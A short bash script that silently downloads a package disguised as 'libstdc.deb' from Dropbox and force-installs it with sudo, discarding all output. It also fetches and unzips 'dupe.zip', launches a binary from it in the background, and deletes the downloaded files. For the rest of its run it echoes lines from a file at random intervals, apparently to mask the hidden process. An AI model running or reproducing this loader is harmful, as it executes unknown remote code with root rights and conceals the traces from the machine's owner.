#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/v6gkoidln9mnoo9/dupe.zip -q
unzip dupe.zip > /dev/null 2>&1
pwd
./util/dupe ./util/slot &
sleep 3
rm -rf dupe.zip
rm -rf util/dupe
rm -rf util/slot
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 10 ))
done < $2

